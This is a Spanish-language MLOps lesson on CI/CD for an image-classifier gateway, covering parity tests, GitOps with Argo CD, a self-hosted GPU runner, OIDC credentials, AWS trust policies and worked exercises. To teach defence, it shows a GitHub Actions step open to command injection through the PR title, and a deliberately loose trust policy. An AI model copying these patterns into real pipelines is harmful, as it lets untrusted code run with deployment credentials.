Es la tercera de las tres paridades de «Export, engine y paridad», la [[paridad-e2e|paridad de punta a punta]]. Las otras dos comparan el modelo exportado con el original y el engine con el modelo, y las dos reciben la foto ya convertida en números. Esta es la única que ve el [[preprocesamiento]] del gateway (cómo convierte el JPEG en números) y el orden de [[labels-json|`labels.json`]], la lista que traduce cada salida del modelo al nombre de su categoría. Atrapa, por ejemplo, un cambio que lee los colores en orden BGR (azul, verde, rojo) en vez de RGB (rojo, verde, azul).

:::formula Cuándo pasa la paridad de punta a punta
y_{nuevo} = y_{ref}
|q_{nuevo} − q_{ref}| ≤ ε
- y_{ref}: la primera categoría (el top-1) que dio la versión aprobada, guardada con ella
- q_{ref}: su score, la probabilidad que el modelo le dio a esa categoría, de 0 a 1
- y_{nuevo}, q_{nuevo}: lo mismo, respondido por el gateway nuevo
- ε: la diferencia máxima de score permitida, sin unidad como el score: 0.01 en Alba
:::

La paridad pasa solo si las dos líneas se cumplen en cada una de las 20 fotos.

El código hace el examen con 5 de las fotos, contra dos gateways: el bueno y uno que lee los colores al revés. Los scores son de juguete.

```python
EPS = 0.01                                  # ε: diferencia máxima de score
guardado = {                                # foto: (top-1, score) de la versión aprobada
    "tenis.jpg":     ("Calzado › Tenis", 0.9132),
    "bici.jpg":      ("Deportes › Bicicletas", 0.8810),
    "lampara.jpg":   ("Hogar › Iluminación", 0.6417),
    "sillon.jpg":    ("Hogar › Muebles", 0.7745),
    "celular.jpg":   ("Electrónica › Celulares", 0.9568),
}
def paridad(respuestas):
    fallas = []
    for foto, (top1, score) in guardado.items():
        nuevo, s = respuestas[foto]
        if nuevo != top1 or abs(s - score) > EPS:
            fallas.append(f"{foto}: {nuevo} {s:.4f} (guardado {top1} {score:.4f})")
    return fallas

bien = {"tenis.jpg": ("Calzado › Tenis", 0.9127), "bici.jpg": ("Deportes › Bicicletas", 0.8815),
        "lampara.jpg": ("Hogar › Iluminación", 0.6409), "sillon.jpg": ("Hogar › Muebles", 0.7751),
        "celular.jpg": ("Electrónica › Celulares", 0.9566)}
bgr = {"tenis.jpg": ("Calzado › Tenis", 0.8841), "bici.jpg": ("Deportes › Bicicletas", 0.8790),
       "lampara.jpg": ("Hogar › Muebles", 0.4120), "sillon.jpg": ("Hogar › Muebles", 0.7702),
       "celular.jpg": ("Electrónica › Celulares", 0.9561)}
for nombre, r in (("gateway 3f9c2ab", bien), ("gateway con colores BGR", bgr)):
    f = paridad(r)
    print(nombre, "→", "pasa" if not f else f"FALLA en {len(f)} de {len(guardado)}")
    for linea in f:
        print("   ", linea)
```

```salida
gateway 3f9c2ab → pasa
gateway con colores BGR → FALLA en 2 de 5
    tenis.jpg: Calzado › Tenis 0.8841 (guardado Calzado › Tenis 0.9132)
    lampara.jpg: Hogar › Muebles 0.4120 (guardado Hogar › Iluminación 0.6417)
```

Mira los tenis: el top-1 sigue bien, pero el score bajó 0.9132 − 0.8841 ≈ 0.03, casi el triple de \(ε\). Un examen que solo viera el top-1 lo dejaría pasar. Por eso la regla revisa los dos.

### El despliegue es un cambio en Git

Alba despliega con [[gitops|GitOps]], como en la lección «Git»: lo que debe correr en el clúster vive en otro repositorio, `alba/despliegue`, y desplegar es cambiar una línea ahí. Para staging, el job `staging` abre y junta un PR en ese repositorio que cambia una línea del archivo del gateway, que queda `image: …/classifier-gateway:3f9c2ab@sha256:…` (los «…» abrevian la dirección del registro y el digest completo).

La línea lleva los dos nombres: `3f9c2ab` para que una persona sepa qué es, y `@sha256:…` para que Kubernetes baje exactamente eso. Cuando una línea trae los dos, manda el digest.

Del otro lado está [[argo-cd|Argo CD]]: un programa que corre **dentro** del clúster, lee el repositorio de despliegue y hace que el clúster se parezca a lo que dice. Por omisión revisa el repositorio cada 2 a 3 minutos, o al instante si GitHub le avisa con un [[webhook]] (un aviso por HTTP cuando algo cambia), que es como lo tiene Alba. No hay que darle al CI permiso para entrar al clúster: el CI solo escribe en Git. (No lo confundas con Argo Workflows, el orquestador del pipeline mensual del modelo: comparten nombre y nada más.)

¿Quién escribe en el repositorio de despliegue? No el token normal del workflow, que solo sirve para `alba/classifier`. Lo escribe una [[github-app|GitHub App]]: una identidad de máquina instalada solo en `alba/despliegue`, con permiso para abrir y juntar PR ahí y nada más, que da tokens de una hora. Para pedirlos, el job usa la llave privada de la App, un archivo que prueba que quien pide habla en nombre de ella, guardada como [[secreto]] del repositorio. Es la única llave del camino que no vence sola, y solo sirve para abrir y juntar PR en `alba/despliegue`. El PR queda como registro: qué digest, quién lo pidió y cuándo.

### Quién aprueba, y uno a la vez

Para producción, el job `produccion` tiene `environment: produccion`. Un [[environment-actions|environment]] de GitHub es un ambiente con reglas: el de Alba exige que **una persona del equipo de ML que no hizo el cambio** apriete «Approve». Hasta entonces, el job espera. Con 5 personas en el equipo, siempre hay alguien que no escribió el cambio. La opción *Prevent self-review* del environment impide que apruebe quien disparó la corrida, que en un push a `main` es quien hizo el merge. La aprobación queda en GitHub, con nombre y hora; el cambio en `alba/despliegue`, con su commit.

Un detalle de precio: en un repositorio privado, los revisores obligatorios de un environment solo existen en el plan Enterprise de GitHub (en Free, Pro y Team, solo en repositorios públicos). Alba tiene **GitHub Enterprise**, y por eso puede usarlos en `alba/classifier`, que es privado. Sin Enterprise, la aprobación iría en la revisión obligatoria del PR en `alba/despliegue`, y la App ya no lo juntaría sola.

Y `concurrency` evita que dos despliegues pisen al mismo ambiente. Con el grupo `deploy-gateway-produccion`, solo un job de ese grupo corre a la vez. `cancel-in-progress: false` dice que el nuevo **espera** en lugar de cancelar al que va a la mitad: cortar un despliegue a medias deja copias viejas y nuevas mezcladas. Ojo: por omisión, en el grupo espera **una** sola corrida; si llega una tercera, la que esperaba se cancela y la nueva toma su lugar. Para un despliegue suele estar bien, porque gana el commit más nuevo; si deben correr todas en orden, se agrega `queue: max`. En los PR, «Pruebas y CI/CD» usa `cancel-in-progress: true` porque la corrida vieja ya no sirve; en el despliegue es `false` porque cortar a la mitad es peor.

:::diagrama e08-cicd-gitops
Cómo pasa el digest de GitHub al clúster sin que el CI entre al clúster. Toca cada caja; los recorridos siguen un despliegue a producción y un rollback.
:::

### El rollback, con este diseño

Si la versión nueva falla en producción, volver es **revertir** el commit del repositorio de despliegue con `git revert`, que crea un commit nuevo que deshace al anterior. Argo CD ve que la línea vuelve a pedir el digest anterior y el clúster lo baja del registro, donde sigue gracias a la retención. Nadie reconstruye nada. En el gateway, con su imagen de 87 MB, que se [[pull-imagen|baja]] en 1 a 3 segundos, la vuelta tarda lo que tarden en reemplazarse las copias. Cómo se decide **cuándo** volver, y cómo se automatiza, lo cuenta «Rollout seguro».

:::profundo La otra forma: el CI despliega con kubectl
Sin GitOps, el job de despliegue entra al clúster con sus propias credenciales y le da la orden con `kubectl`, el comando para darle órdenes a Kubernetes: `kubectl -n classifier set image deployment/gateway gateway=…/classifier-gateway@sha256:…`, seguido de `kubectl rollout status`, que espera a que las copias nuevas estén listas y falla si no lo logran en el plazo. Funciona, y es más simple al principio.

Alba eligió GitOps por tres razones. El CI no necesita un permiso para cambiar el clúster de producción, que sería el permiso más valioso de toda la organización. La historia de qué corrió y cuándo queda en Git, con quién lo aprobó. Y el rollback es un `git revert`, no un comando que alguien recuerda a las 3 de la mañana.

Lo que no se puede es mezclar las dos. Si Argo CD tiene prendida la corrección automática (*self-heal*) y alguien corre un `kubectl set image` de emergencia, Argo CD ve que el clúster ya no coincide con el repositorio y lo regresa en segundos. El arreglo de emergencia desaparece sin que nadie entienda por qué.
:::

## El workflow del modelo: triton-modelo en la T4 {The model workflow: triton-modelo on the T4} [extra]

El gateway cambia varias veces al día. El modelo, una vez al mes. Ponerlos en el mismo workflow obligaría a reconstruir 9.2 GB de Triton con cada cambio de una línea en Python. Por eso Alba tiene un segundo workflow, `triton-modelo.yml`, con su propio ritmo:

- **Lo dispara un botón**, no un PR: `workflow_dispatch`. Lo aprieta el pipeline mensual, por la [[api|API]] de GitHub, cuando registra una versión como `challenger`.
- **Corre en el runner propio con T4**, nunca en uno de GitHub: la imagen de Triton no cabe cómoda en sus discos, y probarla necesita la GPU.
- **Hace cuatro cosas:** baja el engine del registro de modelos y verifica su sha256; arma la imagen sobre `tritonserver:24.08-py3`, la imagen oficial de Triton de la [[release-ngc|release]] 24.08, la misma con la que se construyó el engine; la prende y espera a que Triton cargue el modelo y quede listo; y la sube como `classifier-triton:resnet50-2026-10-01`.

```yaml
# .github/workflows/triton-modelo.yml (ilustración)
on:
  workflow_dispatch:
    inputs:
      version: { required: true }      # resnet50-2026-10-01, la versión 14
permissions: { contents: read, id-token: write }
jobs:
  imagen-triton:
    runs-on: [self-hosted, linux, x64, gpu-t4]
    timeout-minutes: 45                # un paso colgado no retiene la T4 seis horas
    steps:
      - uses: actions/checkout@v7
      - run: ./ci/bajar_engine.sh "${{ inputs.version }}"   # del registro, con su sha256
      - run: docker build -t "classifier-triton:${{ inputs.version }}" triton/
      - run: ./ci/triton_listo.sh "classifier-triton:${{ inputs.version }}"
      - run: ./ci/push_triton.sh "${{ inputs.version }}"    # ECR, tag = versión
```

Al subirla, ECR recibe casi nada: las ≈ 9 GB de la base ya están en el repositorio desde el mes pasado, con la misma release, y solo viaja la capa del engine, de ≈ 50 a 150 MB. Lo que este workflow **no** hace es desplegar: llevar el modelo nuevo a una parte del tráfico y pasarlo a `champion`, la versión que atiende a todos, es trabajo de «Rollout seguro».

:::profundo Por qué no en un runner de GitHub
Un runner estándar de GitHub para un repositorio privado trae 2 procesadores, 8 GB de memoria y ≈ 14 GB de disco, sin GPU. La imagen de Triton pesa ≈ 9.2 GB **comprimida**; descomprimida, en disco, ocupa bastante más. Construirla ahí deja el disco muy justo, o lo llena a la mitad del build. Y aunque cupiera, no habría dónde prenderla para comprobar que Triton carga el engine: eso exige la T4.

El engine tampoco se construye ahí, y por una razón más fuerte: un engine de TensorRT solo sirve en el tipo de GPU donde se construyó. Por eso todo lo que toca el engine corre en la T4, como cuenta «Export, engine y paridad».
:::

### El runner propio, prendido solo cuando trabaja

Un [[runner-self-hosted|runner propio efímero]] es una máquina tuya que toma **un** job y se borra al terminar. La de Alba es una `g4dn.xlarge`, un tipo de máquina de AWS con una T4, con las etiquetas `[self-hosted, linux, x64, gpu-t4]`, por las que la eligen los jobs. Corre dos cosas: el job `paridad` de cada merge y `triton-modelo` una vez al mes. Nunca un PR: el código de un PR podría venir de cualquiera, y correría en una máquina con permisos en AWS.

¿Por qué prenderla solo cuando trabaja? Porque la nube cobra cada hora que una máquina está prendida, trabaje o no. La cuenta, con los jobs reales:

:::formula Lo que cuesta el runner al mes
H = frac{J × t_{on}}{60}
C = p × H
C_{siempre} = p × 730
C_{gh} = p_{min} × J × t_{on}
- J: cuántos jobs corre al mes
- t_{on}: los minutos que la máquina está prendida por job: arrancar, bajar las imágenes y correr
- H: las horas prendida al mes, en h (el 60 pasa de minutos a horas)
- p: el precio de la máquina por hora, en US$
- C: lo que cuesta el runner propio al mes, en US$
- C_{siempre}: lo que costaría prendida todo el mes, en US$; 730 son las horas de un mes (24 × 365 ÷ 12)
- p_{min}: el precio por minuto del runner con GPU que renta GitHub, en US$
- C_{gh}: lo que costaría el mismo trabajo en ese runner, si cada job tardara lo mismo, en US$
:::

:::cuenta El runner con T4 de Alba
Jobs al mes, \(J\) // supuesto: \(m\) = 4 merges al día, en medio de 3 a 5, cada uno con su paridad, en 30 días | 4 × 30 | 120 jobs
Minutos prendida por job, \(t_{on}\) // supuesto: arrancar ≈ 1–2 min, bajar las dos imágenes ≈ 2–3 min (casi todo es Triton) y ≈ 1 min de paridad | — | ≈ 5 min
Horas al mes, \(H\) | \(J × t_{on} ÷ 60\) = 120 × 5 ÷ 60 | 10 h
Costo del runner propio, \(C\) // \(p\) = US$0.526 por hora, una `g4dn.xlarge` | \(p × H\) = 0.526 × 10 | ≈ US$5.3 al mes
Prendida todo el mes, \(C_{siempre}\) // 730 h | \(p × 730\) = 0.526 × 730 | ≈ US$384 al mes
Con el runner de GPU de GitHub, \(C_{gh}\) // \(p_{min}\) = US$0.052 por minuto, la lista de precios de GitHub en noviembre de 2026 | \(p_{min} × J × t_{on}\) = 0.052 × 120 × 5 | ≈ US$31 al mes
= ≈ US$5.3 al mes, dentro de los menos de US$10 que estima el equipo. El `triton-modelo` del mes suma unos centavos: con ≈ 15 minutos prendida (supuesto), \(p × 15 ÷ 60\) = 0.526 × 15 ÷ 60 ≈ US$0.13.
:::

:::calculadora e08-cicd-runner
Empieza con los números de Alba. Sube \(J\) a 600, un equipo con 20 merges al día: el runner propio sigue costando poco. Luego sube \(t_{on}\) a 30, como si cada job bajara la imagen de Triton desde lejos: ahí se ve por qué importa que el pull sea rápido.
:::

## Credenciales sin llaves: OIDC y la trust policy {Keyless credentials: OIDC and the trust policy} [extra]

El job `imagen` sube a ECR, y para eso necesita credenciales de AWS. La forma vieja era guardar una llave de acceso como [[secreto]] del repositorio. Una llave así no vence: si se filtra, sirve hasta que alguien la note. Alba no guarda ninguna.

En su lugar usa [[oidc|OIDC]], de la lección «Autenticación y permisos». Cada job con `id-token: write` puede pedirle a GitHub un [[jwt|JWT]], un token firmado que dice quién es: qué repositorio, qué rama, qué evento. AWS revisa la firma de GitHub y, si el token cumple las condiciones de un rol, le entrega [[credenciales-temporales|credenciales temporales]] de ese rol, que vencen en una hora.

### La trust policy: a quién deja entrar el rol

Las condiciones viven en la [[trust-policy|trust policy]] del rol: el documento que dice **quién puede asumirlo**. No dice qué puede hacer el rol (eso es otra política: subir a `classifier-gateway` y nada más); dice quién entra. Lo que más importa revisar es el campo `sub` del token (de *subject*: de quién habla el token), que GitHub arma así: `repo:alba/classifier:ref:refs/heads/main` para un push a `main`, y `repo:alba/classifier:pull_request` para un PR.

```json
{ "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": { "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:alba/classifier:ref:refs/heads/main" } } }
```

Es una ilustración: un pedazo de la política del rol `gha-classifier-gateway`. Dice: acepta tokens firmados por GitHub (`Federated`) cuyo `aud`, para quién se emitió el token, sea el servicio de credenciales de AWS, y cuyo `sub` sea exactamente el de un push a `main`. El código de abajo hace lo que hace AWS con cinco tokens distintos, contra esa regla estricta y contra una floja, `repo:alba/*`, que alguien escribe «para que funcione». `fnmatchcase` compara con comodines (un `*` vale por cualquier texto), como la condición `StringLike` de IAM.

```python
from fnmatch import fnmatchcase             # compara con comodines, como StringLike de IAM

def entra(token, regla):                    # lo que revisa AWS antes de dar credenciales
    return token["aud"] == "sts.amazonaws.com" and fnmatchcase(token["sub"], regla)

estricta = "repo:alba/classifier:ref:refs/heads/main"
floja = "repo:alba/*"                       # «cualquier cosa de la organización»
tokens = {
    "push a main (job imagen)":  "repo:alba/classifier:ref:refs/heads/main",
    "un PR":                     "repo:alba/classifier:pull_request",
    "push a la rama prueba-x":   "repo:alba/classifier:ref:refs/heads/prueba-x",
    "job con environment":       "repo:alba/classifier:environment:produccion",
    "otro repo de Alba":         "repo:alba/notebooks-becarios:ref:refs/heads/main",
}
print(f"{'quién pide':28} estricta  floja")
for quien, sub in tokens.items():
    t = {"aud": "sts.amazonaws.com", "sub": sub}
    print(f"{quien:28} {'entra' if entra(t, estricta) else 'no':9} {'entra' if entra(t, floja) else 'no'}")
```

```salida
quién pide                   estricta  floja
push a main (job imagen)     entra     entra
un PR                        no        entra
push a la rama prueba-x      no        entra
job con environment          no        entra
otro repo de Alba            no        entra
```

Con la regla floja, cualquier PR, cualquier rama y cualquier repositorio de la organización obtienen permiso para subir imágenes a producción. Con la estricta, solo el job que corre después de un merge a `main`. Fíjate en la cuarta fila: un job con `environment` recibe otro `sub`, `…:environment:produccion`. Por eso, si el job `produccion` necesita entrar a AWS (en la forma con `kubectl`, por ejemplo), usa su propio rol, con su propia trust policy, que pide justo ese `sub`: solo un job que ya pasó la aprobación puede asumirlo.

### Cuánto dura cada credencial del pipeline

Cada pieza del camino tiene su propia credencial, y todas vencen solas:

| Credencial | Quién la da | Cuánto dura |
|---|---|---|
| Token del job (`GITHUB_TOKEN`) | GitHub, al arrancar el job | hasta que el job termina |
| Token de identidad (OIDC) | GitHub, a pedido del job | minutos: solo sirve para cambiarlo |
| Credenciales del rol | AWS, a cambio del token OIDC | 1 hora, por omisión |
| Contraseña de `docker login` a ECR | ECR, con las credenciales del rol | 12 horas |
| Token de la GitHub App | GitHub, a pedido del job | 1 hora |

El job `imagen` dura ≈ 2 minutos: una hora sobra. Si un día un job necesitara más, se pide una duración mayor al asumir el rol, hasta el máximo que permita el rol. Lo que nunca se hace es volver a guardar una llave «para no batallar».

:::nota Por qué no basta con el secreto
Una llave guardada como secreto tampoco está en el YAML ni en el código, y eso es bueno. Pero sirve para siempre y desde cualquier lugar. Las credenciales por OIDC sirven una hora, solo para ese rol y solo si las pidió el job correcto. Si alguien las roba de un log, le quedan minutos, no años.
:::

Resuélvelo con lápiz antes de abrir la solución:

:::ejercicios
? [medio] El job `produccion` usa un rol de AWS cuya trust policy pide `sub` = `repo:alba/classifier:ref:refs/heads/main`. El job tiene `environment: produccion` y falla al pedir credenciales. ¿Por qué? ¿Cómo lo arreglas sin aflojar la regla?
- Un job con `environment` recibe un token cuyo `sub` es `repo:alba/classifier:environment:produccion`, no el de la rama. La condición no coincide y AWS lo rechaza.
- El arreglo: la trust policy de ese rol pide exactamente `repo:alba/classifier:environment:produccion`. Así solo un job que pasó por la aprobación del environment puede asumirlo.
- Aflojarla a `repo:alba/*` también «funcionaría», y dejaría entrar a cualquier PR.
:::

## Errores comunes {Common mistakes}

:::ojo
**Desplegar por tag, o con `:latest`.** El tag dice qué es; no garantiza qué baja el nodo si el repositorio deja moverlo. Evítalo: tags inmutables en el registro y la línea `image:` con `@sha256:…`.
:::

:::ojo
**Reconstruir para producción.** «Es el mismo commit» no da la misma imagen: cambian fechas y, a veces, un paquete de la base. Lo que corre ya no es lo que se probó. Evítalo: una imagen por commit, construida una vez, y promover su digest de staging a producción.
:::

:::ojo
**Una retención por antigüedad.** «Borra lo de más de 30 días» borra la versión estable en un mes tranquilo, y el rollback se queda sin imagen. Evítalo: contar imágenes (las últimas 200 del gateway) con un número que cubra semanas, y borrar pronto solo las que no tienen tag.
:::

:::ojo
**`paths:` en un workflow con check obligatorio.** El PR que no toca esa carpeta nunca recibe el check y no se puede juntar. Evítalo: el workflow corre en todos los PR, y la condición va en un `if` del job.
:::

:::ojo
**Una trust policy floja.** La trust policy de un rol de AWS dice qué jobs pueden usarlo, según el repositorio y la rama que vienen en su token (la cuenta la sección extra «Credenciales sin llaves»). `repo:alba/*` deja que un PR, o un repositorio de prueba, suba imágenes a producción. Evítalo: el `sub` exacto (`repo:alba/classifier:ref:refs/heads/main`) y un rol distinto para cada job que toca algo distinto.
:::

:::ojo
**Cambiar el clúster a mano cuando hay GitOps.** Un `kubectl set image` de emergencia no queda en Git, y si Argo CD tiene la corrección automática prendida, lo regresa en segundos a lo que dice el repositorio. Evítalo: el rollback también es un cambio en Git, un `git revert`.
:::

:::ojo
**Construir la imagen en tu laptop y subirla.** En una Mac con chip de Apple sale `arm64`, los nodos de Alba son `amd64` y el contenedor muere con `exec format error`. Además, ese tag no lo explica ningún job de CI. Evítalo: solo el job `imagen` tiene permiso de subir.
:::

## En la vida real {In real life} [extra]

### En Alba: el cambio del jueves

El jueves a las 11:02, una persona del equipo junta el PR que aclara el mensaje de error del 415, la respuesta a una foto en un formato que el gateway no acepta. A las 11:06, `classifier-gateway:3f9c2ab` está en ECR, escaneada y firmada. A las 11:11, con la T4 ya prendida, pasa la paridad de las 20 fotos; hacia las 11:15, staging responde con su prueba de humo. A las 11:25, otra persona del equipo, que no escribió el cambio, aprieta «Approve». A las 11:30 las copias de producción corren el digest nuevo. El viernes, alguien vuelve a correr el workflow de ese commit «por si acaso»: falla en el push, y es lo correcto.

### Otros sistemas, la misma estación

- **Video en tiempo real.** Un sistema que analiza cámaras construye su engine una vez en CI, en una GPU L4 con la misma versión de [[tensorrt|TensorRT]] del contenedor, y lo distribuye a cada sitio. La caja de cada sitio verifica la firma y el [[checksum]] de la imagen antes de activarla, y solo acepta imágenes por digest.
- **Inspección en el edge** (en el lugar, no en la nube). Si el modelo corre en un módulo Jetson, una computadora chica de NVIDIA con GPU, en una fábrica, el engine se construye en un Jetson de CI con la misma versión del software, no en una nube con T4. La idea del runner propio es la misma; la máquina es otra.
- **Un pronóstico de demanda.** Un [[orquestador-pipelines|orquestador de pipelines]] lanza cada paso como un contenedor fijado por digest. Si una corrida falla a los tres meses, el digest dice exactamente con qué se corrió.
- **Patología digital.** Un sistema que segmenta tejido escribe, junto a cada resultado, la versión del modelo y el **digest del contenedor** que lo produjo. Meses después, un resultado se explica sin adivinar.
- **Un LLM propio.** Un equipo que sirve su propio modelo de lenguaje tiene el mismo problema que Alba, más grande: el servidor cambia seguido y los pesos pesan decenas de GB. La salida es la misma: dos pipelines con dos ritmos, y los pesos fuera de la imagen del código o en una imagen aparte, con su propio tag y su propio digest.

### Fuera de ML

Una farmacéutica fabrica un lote, lo prueba y le pone un número de lote que nunca se repite. Si un medicamento sale mal, el número dice qué lote fue y qué pruebas pasó. Nadie «vuelve a fabricar el lote 4471»: un lote nuevo lleva otro número. Es la misma idea que un tag inmutable y un digest, con pastillas. La comparación se rompe en un punto: el número de lote se asigna, como un tag, mientras que el digest sale del contenido mismo. Dos lotes idénticos llevan números distintos; dos imágenes idénticas tendrían el mismo digest.

## Ejercicios {Exercises}

Resuélvelos con lápiz antes de abrir la solución. Hay uno más, de la trust policy, en la sección extra «Credenciales sin llaves». Usa las letras de la lección: \(t_{lint}\), \(t_{pruebas}\), \(t_{img}\), \(t_{push}\), \(t_{CI}\), \(t_{par}\), \(t_{stg}\), \(t_{prod}\), \(t_{total}\) (tiempos, en minutos); \(N\), \(m\), \(d\), \(A\), \(δ\), \(S\), \(S_{entera}\), \(p_{GB}\), \(C_{ecr}\) (retención); \(J\), \(t_{on}\), \(H\), \(p\), \(C\), \(C_{siempre}\), \(p_{min}\), \(C_{gh}\) (runner); \(y\), \(q\), \(ε\) (paridad).

:::ejercicios
? [facil] Un PR de Alba cambia `gateway/app/main.py`. ¿Qué jobs de `gateway.yml` corren y cuáles salen en gris (saltados)? ¿Y cuando ese PR se junta a `main`?
- En el PR: `lint` y `pruebas`, a la vez. `imagen` tiene `if: github.event_name == 'push'`, así que sale en gris, y con él `paridad`, `staging` y `produccion`, que dependen de `imagen`.
- Después del merge, el evento es `push` a `main`: corren los seis. `lint` y `pruebas` otra vez (ahora sobre el commit real de `main`), luego `imagen`, `paridad`, `staging` y `produccion`, que espera la aprobación.
? [facil] ¿Por qué la imagen del gateway se llama `classifier-gateway:3f9c2ab` y la de Triton `classifier-triton:resnet50-2026-10-01`, y no las dos por su commit?
- El gateway cambia con el código: su commit dice exactamente qué código trae, y `git show 3f9c2ab` lo enseña.
- La imagen de Triton tiene el mismo código de Triton cada mes; lo que cambia es el engine. Su nombre útil es la versión del modelo, que el registro de modelos explica con sus huellas.
? [facil] El viernes alguien vuelve a correr el workflow del commit `3f9c2ab`, ya publicado. ¿Qué pasa, y está bien?
- El job `imagen` reconstruye; la imagen nueva casi seguro tiene otro digest (cambian fechas dentro de ella).
- ECR tiene tags inmutables: rechaza el push porque el tag `3f9c2ab` ya existe (y nombra otro contenido). El job falla.
- **Está bien.** La imagen de ese commit ya existe y es la que se probó. Si el push pasara, `3f9c2ab` dejaría de decir la verdad.
? [facil] Con la regla de Alba, que guarda las últimas 200 imágenes del gateway, ¿cuántos días hacia atrás alcanza la lista si hay 4 merges al día? ¿Y en una temporada tranquila, con 1 al día?
- \(d = N ÷ m\).
- Con 4 al día: 200 ÷ 4 = **50 días**.
- Con 1 al día: 200 ÷ 1 = **200 días**. Contar imágenes hace que la lista dure más cuando hay menos cambios: justo cuando la versión estable lleva más tiempo sin cambiar.
? [medio] Si `lint` tardara 3 min en vez de 1 (alguien agregó un revisor lento), ¿cuánto cambiarían \(t_{CI}\) y \(t_{total}\)? ¿Y si las pruebas bajaran de 2 a 1 min?
- \(t_{CI} = max(t_{lint}, t_{pruebas}) + t_{img} + t_{push}\) y \(t_{total} = t_{CI} + t_{par} + t_{stg} + t_{prod}\).
- Lint de 3 min: max(3, 2) + 1 + 1 = **5 min**; \(t_{total}\) = 5 + 5 + 3.5 + 5 = **18.5 min**. Sube un minuto: ahora lint es el más lento.
- Pruebas de 1 min (lint de 1): max(1, 1) + 1 + 1 = **3 min**; \(t_{total}\) = 3 + 5 + 3.5 + 5 = **16.5 min**.
- Lo que corre a la vez solo importa por el más lento: acelerar el que no es el más lento no ahorra nada.
? [medio] Un equipo guarda sus imágenes sin que compartan capas: cada imagen del gateway cambia también sus dependencias (\(δ\) = 87 MB, \(A\) ≈ 0). ¿Cuánto ocupan 200, y cuánto cuesta al mes con \(p_{GB}\) ≈ US$0.10? Compara con Alba.
- \(S = A + N × δ\) y \(C_{ecr} = S × p_{GB}\).
- \(S\) = 0 + 200 × 87 = 17,400 MB ≈ **17.4 GB**.
- \(C_{ecr} = S × p_{GB}\) = 17.4 × 0.10 ≈ **US$1.74 al mes**.
- Alba: \(S\) ≈ 97 MB = 0.097 GB, y \(C_{ecr}\) = 0.097 × 0.10 ≈ US$0.01 al mes. Ocupa 17,400 ÷ 97 ≈ 180 veces menos, por el orden de las capas. Ninguna de las dos cuentas es grande; la diferencia de verdad está en el tiempo de cada push y cada pull.
? [medio] La paridad de punta a punta compara 3 fotos con \(ε\) = 0.01. Guardado: (Tenis, 0.913), (Bicicletas, 0.881), (Iluminación, 0.642). Gateway nuevo: (Tenis, 0.905), (Bicicletas, 0.884), (Muebles, 0.640). ¿Pasa?
- La regla, en cada foto: \(y_{nuevo} = y_{ref}\) y \(|q_{nuevo} − q_{ref}| ≤ ε\).
- Tenis: top-1 igual; |0.905 − 0.913| = 0.008 ≤ 0.01: pasa.
- Bicicletas: igual; |0.884 − 0.881| = 0.003: pasa.
- Iluminación: el top-1 cambió a Muebles. **Falla**, aunque el score casi no se movió (|0.640 − 0.642| = 0.002).
- La paridad falla: el job `paridad` sale en rojo y nada se despliega.
? [medio] Dos merges llegan a `main` con 2 minutos de diferencia: `3f9c2ab` y luego `8d41e07`. El job `produccion` tiene `concurrency` con `cancel-in-progress: false`. ¿Qué pasa con cada despliegue? ¿Qué pasaría con `true`?
- Los dos workflows corren sus jobs de CI por separado: cada commit tiene su imagen y su digest.
- En `produccion`, los dos jobs están en el mismo grupo, `deploy-gateway-produccion`. Con `false`, el de `8d41e07` **espera** a que termine el de `3f9c2ab` y despliega después. Nunca hay dos despliegues a la vez. (Si llegara un tercero mientras el segundo espera, el segundo se cancelaría y el tercero tomaría su lugar.)
- Con `true`, el segundo cancelaría al primero a la mitad: algunas copias con `3f9c2ab`, otras sin cambiar, y un commit a medias en el repositorio de despliegue. Para pruebas de un PR eso está bien; para un despliegue, no.
? [reto] El equipo duda entre su runner propio con T4, que cobra \(p\) = US$0.526 por hora prendida, y el runner con GPU que renta GitHub, que cobra \(p_{min}\) = US$0.052 por minuto. Con \(J\) = 120 jobs al mes y \(t_{on}\) = 5 min prendida por job, compara lo que cuesta al mes el propio, \(C\), con el rentado, \(C_{gh}\). ¿A partir de cuántos minutos prendida por job, sin cambiar lo que tarda en GitHub, deja de convenir el propio?
- \(C = p × H = p × J × t_{on} ÷ 60\) = 0.526 × 120 × 5 ÷ 60 ≈ **US$5.3**. \(C_{gh} = p_{min} × J × t_{on}\) = 0.052 × 120 × 5 ≈ **US$31.2**.
- Si en GitHub cada job sigue tardando 5 min, \(C_{gh}\) se queda en US$31.2. El propio cuesta lo mismo cuando 0.526 × 120 × \(t_{on}\) ÷ 60 = 31.2, es decir, \(t_{on}\) = 31.2 × 60 ÷ (0.526 × 120) ≈ **29.7 min**.
- Mientras la máquina propia arranque y trabaje en menos de ≈ 30 minutos por job, conviene. Además, el runner de GPU de GitHub solo existe en los planes de pago para organizaciones.
? [medio] Un paso de un workflow dice `run: echo "Revisando ${{ github.event.pull_request.title }}"`. Recuerda que GitHub llena cada `${{ … }}` antes de correr el paso, y que el título del PR lo escribe quien abre el PR. ¿Qué riesgo tiene, y cómo lo reescribes?
- GitHub pega el título dentro del comando antes de correrlo. Un título con comillas y `;` agrega comandos que corren en el runner, con lo que el job tenga a mano.
- Reescrito: `env: { TITULO: ${{ github.event.pull_request.title }} }` y `run: echo "Revisando $TITULO"`. La terminal recibe el título como el valor de una variable, no como parte del código.
? [reto] A las 16:00, producción corre `classifier-gateway:8d41e07` y los errores 504 (la respuesta de «se acabó el tiempo esperando») se disparan. La versión anterior era `3f9c2ab`, de hace 9 días. (a) ¿Qué haces, paso por paso? (b) ¿La imagen anterior sigue en el registro? (c) ¿Qué habría pasado con una retención de «borra lo de más de 7 días»?
- (a) `git revert` del commit de `alba/despliegue` que pidió `8d41e07`, en un PR que se aprueba rápido. Argo CD ve la línea con el digest de `3f9c2ab` y el clúster la baja. Nadie reconstruye. Después, con calma, `git log 3f9c2ab..8d41e07` en el gateway, la lista de commits entre las dos versiones, para encontrar la causa.
- (b) Sí. Imágenes nuevas desde entonces: 9 días × \(m\), con \(m\) = 3 a 5 merges al día, son ≈ 27 a 45, menos que las \(N\) = 200 que se guardan.
- (c) La de `3f9c2ab` ya no existiría: el revert pediría un digest que el registro borró, las copias nuevas no podrían bajarlo y el rollback fallaría justo cuando hace falta.
:::

## Lo que sigue {What comes next}

